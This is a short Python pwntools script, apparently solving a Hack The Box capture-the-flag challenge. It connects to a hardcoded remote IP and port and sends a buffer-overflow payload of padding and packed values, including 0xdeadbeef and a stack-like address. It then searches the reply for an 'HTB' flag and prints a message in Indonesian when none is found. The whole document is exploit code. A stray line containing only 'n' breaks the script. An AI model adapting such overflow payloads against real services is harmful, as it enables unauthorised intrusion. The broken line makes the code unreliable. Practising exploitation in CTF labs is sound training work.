#!/usr/bin/python3.8

from pwn import *
from time import sleep

IP   = '94.237.56.47'
PORT = 58911

r = remote(IP, PORT)


payload = b'A' * 32  
payload += p64(0xdeadbeef) 
payload += p64(0x4141414141414141)  
payload += p64(0x00007ffdbb8fa328)  
r.sendline(payload)
n
sleep(1)


response = r.recvall() 
print(response.decode())  

if b'HTB' in response:
    success(f'Flag --> {response.strip().decode()}')
else:
    print("Flag tidak ditemukan dalam response.")
